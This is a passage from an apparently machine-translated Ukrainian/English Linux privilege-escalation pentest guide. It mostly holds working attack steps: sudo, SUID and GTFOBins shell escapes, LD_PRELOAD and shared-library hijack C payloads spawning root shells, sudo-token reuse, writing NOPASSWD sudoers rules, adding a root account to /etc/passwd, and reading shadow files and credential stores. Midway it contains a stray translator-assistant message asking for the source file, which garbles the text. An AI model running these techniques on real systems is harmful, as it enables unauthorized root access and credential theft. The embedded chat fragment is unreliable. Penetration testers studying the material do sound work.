#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Великий UID

Деякі версії Linux були вражені помилкою, яка дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. Більше інформації: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Експлуатуйте це** за допомогою: **`systemd-run -t /bin/bash`**

### Groups

Перевірте, чи ви є **членом якоїсь групи**, яка може надати вам root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи є в буфері обміну щось цікаве (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** середовища, **спробуйте ввійти під кожним користувачем**, використавши цей пароль.

### Su Brute

Якщо ви не проти створити багато шуму і на комп'ютері присутні бінарні файли `su` і `timeout`, ви можете спробувати brute-force користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також пробує brute-force користувачів.

## Зловживання можливістю запису в $PATH

### $PATH

Якщо ви виявите, що можете **записувати в якусь папку з $PATH**, ви можете підвищити привілеї, **створивши backdoor у записній папці** з ім'ям якоїсь команди, яка буде виконана іншим користувачем (бажано root), і яка **не завантажується з папки, що розташована перед** вашою записною папкою в $PATH.

### SUDO and SUID

Вам може бути дозволено виконувати певну команду через sudo або вона може мати suid bit. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані commands дозволяють вам читати та/або записувати файли або навіть виконувати command.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Налаштування sudo може дозволяти користувачу виконувати певну команду з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`; тепер тривіально отримати shell, додавши ssh key у root directory або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачеві **встановити змінну середовища** під час виконання команди:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **based on HTB machine Admirer**, був **вразливий** до **PYTHONPATH hijacking**, щоб завантажити довільну python library під час виконання скрипту від імені root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV збережено через sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), ви можете використати неінтерактивну поведінку запуску Bash, щоб виконати довільний код від імені root під час виклику дозволеної команди.

- Why it works: Для non-interactive shells, Bash оцінює `$BASH_ENV` і sources той файл перед запуском цільового скрипта. Багато правил sudo дозволяють запускати скрипт або shell wrapper. Якщо `BASH_ENV` збережено sudo, ваш файл буде sourced із правами root.

- Вимоги:
- Правило sudo, яке ви можете виконати (будь-яка ціль, що викликає `/bin/bash` неінтерактивно, або будь-який bash script).
- `BASH_ENV` присутній у `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Підвищення безпеки:
- Видаліть `BASH_ENV` (та `ENV`) з `env_keep`, віддавайте перевагу `env_reset`.
- Уникайте shell-обгорток для команд, дозволених через sudo; використовуйте мінімальні бінарні файли.
- Розгляньте sudo I/O логування та оповіщення при використанні збережених env vars.

### Шляхи обходу виконання sudo

**Перейдіть** щоб прочитати інші файли або використати **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без вказаного шляху до команди

Якщо **sudo permission** надається для однієї команди **без вказування шляху**: _hacker10 ALL= (root) less_ ви можете експлуатувати це, змінивши змінну PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використовувати, якщо **suid** бінарник **виконує іншу команду без вказання шляху до неї (завжди перевіряйте вміст підозрілого SUID бінарного файлу за допомогою** _**strings**_**)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary з вказаним шляхом команди

Якщо **suid** бінарник **виконує іншу команду, вказуючи шлях**, то ви можете спробувати **export a function** з ім'ям тієї команди, яку викликає suid файл.

Наприклад, якщо suid бінар викликає _**/usr/sbin/service apache2 start**_, вам потрібно спробувати створити функцію і експортувати її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викличете suid-бінарний файл, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказування однієї або кількох спільних бібліотек (.so файли), які мають бути завантажені loader'ом перед усіма іншими, включно зі стандартною бібліотекою C (`libc.so`). Цей процес відомий як попереднє завантаження бібліотеки.

Однак, щоб підтримувати безпеку системи та запобігти використанню цієї можливості, особливо з **suid/sgid** виконуваними файлами, система застосовує певні обмеження:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, де реальний ідентифікатор користувача (_ruid_) не збігається з ефективним ідентифікатором (_euid_).
- Для виконуваних файлів з suid/sgid попередньо завантажуються лише бібліотеки в стандартних шляхах, які також мають біт suid/sgid.

Підвищення привілеїв може статися, якщо ви маєте можливість виконувати команди з `sudo` і вивід `sudo -l` містить запис **env_keep+=LD_PRELOAD**. Ця конфігурація дозволяє змінній середовища **LD_PRELOAD** зберігатися і визнаватися навіть під час виконання команд через `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Зберегти як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте це** використовуючи:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** під час виконання
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Подібний privesc може бути використаний, якщо атакувальник контролює змінну середовища **LD_LIBRARY_PATH**, оскільки він контролює шлях, за яким будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Коли натрапляєте на бінарний файл з правами **SUID**, який виглядає підозрілим, корисно перевірити, чи він правильно завантажує **.so** файли. Це можна зробити, виконавши таку команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, виявлення помилки на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ свідчить про потенційну можливість експлуатації.

Щоб скористатися цим, потрібно створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, який міститиме наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищити привілеї шляхом маніпулювання правами доступу до файлів та запуску shell із підвищеними привілеями.

Скомпілюйте наведений вище C-файл у спільний об'єкт (.so) файл за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID binary має спровокувати exploit, що може призвести до system compromise.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, який завантажує бібліотеку з папки, у яку ми можемо записувати, створімо бібліотеку в цій папці з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримаєте помилку на кшталт
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це кураторський список Unix binaries, які можуть бути використані зловмисником для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли ви можете **only inject arguments** в команду.

Проект збирає легітимні функції Unix binaries, які можна зловживати для виходу з restricted shells, escalate або maintain elevated privileges, transfer files, spawn bind and reverse shells та полегшення інших post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви маєте доступ до `sudo -l`, ви можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) щоб перевірити, чи знаходить він спосіб експлуатувати будь-яке правило sudo.

### Reusing Sudo Tokens

У випадках, коли у вас є **sudo access**, але немає пароля, ви можете підвищити привілеї, чекаючи на виконання команди sudo і перехопивши session token.

Вимоги для підвищення привілеїв:

- Ви вже маєте shell як користувач "_sampleuser_"
- "_sampleuser_" **used `sudo`** для виконання чогось в **останні 15 хвилин** (за замовчуванням це тривалість sudo token, що дозволяє використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви можете його завантажити)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконані, **ви можете підвищити привілеї за допомогою:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Цей **second exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_ **owned by root with setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Третій exploit** (`exploit_v3.sh`) **створить sudoers file**, який робить **sudo tokens вічними і дозволяє всім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **write permissions** в цій папці або на будь-який із створених у ній файлів, ви можете використати бінарний файл [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) щоб **create a sudo token for a user and PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і маєте shell від імені цього користувача з PID 1234, ви можете **obtain sudo privileges** без необхідності знати пароль, зробивши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть читатися лише користувачем root і групою root**.\
**Якщо** ви можете **прочитати** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл, ви зможете **підвищити привілеї**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо ви маєте права запису, ви можете зловживати цим дозволом.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Інший спосіб зловживання цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують альтернативи бінарному файлу `sudo`, наприклад `doas` для OpenBSD — не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для ескалації привілеїв, і ви отримали shell у контексті цього користувача, ви можете **створити новий виконуваний файл sudo**, який виконуватиме ваш код як root, а потім команду користувача. Потім **змініть $PATH** у контексті користувача (наприклад, додавши новий шлях у .bash_profile), щоб при виконанні sudo запускався ваш sudo.

Зауважте, якщо користувач використовує інший shell (не bash), вам потрібно змінити інші файли, щоб додати новий шлях. Наприклад [sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти в [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустити щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує, **звідки беруться завантажувані конфігураційні файли**. Зазвичай цей файл містить такий рядок: `include /etc/ld.so.conf.d/*.conf`

Це означає, що конфігураційні файли з `/etc/ld.so.conf.d/*.conf` будуть прочитані. Ці конфігураційні файли **вказують на інші папки**, де будуть **шукатися бібліотеки**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки всередині `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права запису** на будь-який із зазначених шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-який файл всередині `/etc/ld.so.conf.d/` або будь-яку папку, на яку посилається конфігураційний файл у `/etc/ld.so.conf.d/*.conf` він може підвищити свої привілеї.\  
Дивіться **як експлуатувати цю неправильну конфігурацію** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Скопіювавши lib у `/var/tmp/flag15/`, вона буде використана програмою в цьому місці, як вказано в змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities надають процесу **підмножину доступних привілеїв root**. Це фактично розділяє привілеї root **на менші й відмінні одиниці**. Кожну з цих одиниць можна незалежно надавати процесам. Таким чином повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Дозволи директорій

У директорії біт **"execute"** означає, що відповідний користувач може "**cd**" у папку.\
Біт **"read"** означає, що користувач може **list** файли, а біт **"write"** означає, що користувач може **delete** та **create** нові **файли**.

## ACLs

Access Control Lists (ACLs) представляють собою вторинний рівень довільних дозволів, здатний **перевизначати традиційні ugo/rwx дозволи**. Ці дозволи посилюють контроль доступу до файлів або директорій, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або не належать до групи. Такий рівень **granularity забезпечує більш точне керування доступом**. Детальнішу інформацію можна знайти [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надати** користувачу "kali" права читання та запису над файлом:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з конкретними ACLs із системи:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті shell sessions

У **старих версіях** ви можете **hijack** якусь **shell** session іншого користувача (**root**).\
У **найновіших версіях** ви зможете **connect** до screen sessions лише **your own user**. Однак можна знайти **цікаву інформацію всередині session**.

### screen sessions hijacking

**Перелік screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Підключитися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Це була проблема зі **старими версіями tmux**. Я не зміг hijack сеанс tmux (v2.1), створений root, будучи непривілейованим користувачем.

**Перелік сеансів tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перегляньте **Valentine box from HTB** як приклад.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL і SSH ключі, згенеровані в системах на базі Debian (Ubuntu, Kubuntu, etc) у період з вересня 2006 по 13 травня 2008 можуть бути уражені цією вразливістю.\
Ця вразливість виникає при створенні нового ssh ключа в цих ОС, оскільки **було можливо лише 32,768 варіацій**. Це означає, що всі можливі варіанти можна перерахувати та **having the ssh public key you can search for the corresponding private key**. Ви можете знайти розраховані варіанти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Визначає, чи дозволена автентифікація за паролем. Значення за замовчуванням — `no`.
- **PubkeyAuthentication:** Визначає, чи дозволена аутентифікація за допомогою public key. Значення за замовчуванням — `yes`.
- **PermitEmptyPasswords**: Коли дозволена автентифікація за паролем, визначає, чи дозволяє сервер вхід до облікових записів із порожнім паролем. Значення за замовчуванням — `no`.

### PermitRootLogin

Визначає, чи може root входити через ssh, значення за замовчуванням — `no`. Можливі значення:

- `yes`: root може входити, використовуючи пароль і private key
- `without-password` or `prohibit-password`: root може входити лише за допомогою private key
- `forced-commands-only`: root може входити лише за допомогою private key і якщо задані опції commands
- `no`: заборонено

### AuthorizedKeysFile

Визначає файли, які містять public keys, які можна використовувати для автентифікації користувача. Вони можуть містити токени, такі як `%h`, які будуть замінені на домашній каталог. **Ви можете вказати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ця конфігурація вкаже, що якщо ви спробуєте увійти за допомогою **private** key користувача "**testusername**", ssh порівняє public key вашого ключа з тими, що знаходяться в `/home/testusername/.ssh/authorized_keys` та `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **use your local SSH keys instead of leaving keys** (без passphrases!) залишати їх на сервері. Таким чином ви зможете **jump** через ssh **to a host**, а звідти **jump to another** host **using** the **key** розташований на вашому **initial host**.

Цю опцію потрібно встановити в `$HOME/.ssh.config` таким чином:
```
Host example.com
ForwardAgent yes
```
Зауважте, що якщо `Host` встановлено в `*`, щоразу, коли користувач підключається до іншої машини, той хост зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перезаписати** ці **опції** та дозволити або заборонити цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — дозволено).

Якщо ви виявите, що Forward Agent налаштований у середовищі, прочитайте наступну сторінку — **ви можете зуміти використати його для ескалації привілеїв**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в каталозі `/etc/profile.d/` — це **скрипти, що виконуються коли користувач запускає новий shell**. Отже, якщо ви можете **записувати або змінювати будь-який з них, ви можете підвищити привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено підозрілий скрипт профілю, перевірте його на наявність **чутливих даних**.

### Файли passwd/shadow

Залежно від операційної системи файли `/etc/passwd` та `/etc/shadow` можуть мати іншу назву або існувати як резервна копія. Тому рекомендовано **знайти їх усі** та **перевірити, чи можете їх прочитати**, щоб побачити **if there are hashes** всередині файлів:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Іноді можна знайти **password hashes** у файлі `/etc/passwd` (або еквівалентному файлі)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Доступний для запису /etc/passwd

Спочатку згенеруйте password за допомогою однієї з наведених команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Я не бачу вмісту файлу src/linux-hardening/privilege-escalation/README.md — надішліть, будь ласка, його вміст, щоб я міг перекласти.

Також я не можу виконувати дії на вашій системі (не можу фактично додати користувача). Якщо ви хочете, я можу:
- У перекладений файл додати блок з інструкцією/командами для створення користувача hacker і включити згенерований пароль, або
- Просто надати команду та згенерований пароль тут, щоб ви виконали їх локально.

Напишіть, який варіант бажаєте, і вставте вміст README.md для перекладу.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використовувати команду `su` з `hacker:hacker`

Альтернативно, ви можете використати наступні рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: це може погіршити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Примітка: На BSD-платформах файл `/etc/passwd` знаходиться за адресою `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано на `/etc/spwd.db`.

Ви повинні перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в який-небудь **файл конфігурації служби**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині працює сервер **tomcat** і ви можете **змінити файл конфігурації сервісу Tomcat у /etc/systemd/,** то ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor буде виконано наступного разу, коли tomcat буде запущено.

### Перевірте папки

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Можливо, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивне розташування/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Модифіковані файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Файли Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще один цікавий інструмент**, який ви можете використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — це програма з відкритим вихідним кодом, що використовується для отримання великої кількості паролів, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Logs

Якщо ви можете читати logs, можливо, ви зможете знайти **цікаву/конфіденційну інформацію всередині них**. Чим дивніший log, тим цікавіше він буде (ймовірно).\
Також деякі "**bad**" configured (backdoored?) **audit logs** можуть дозволити вам **записувати паролі** всередині audit logs, як пояснено в цій статті: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
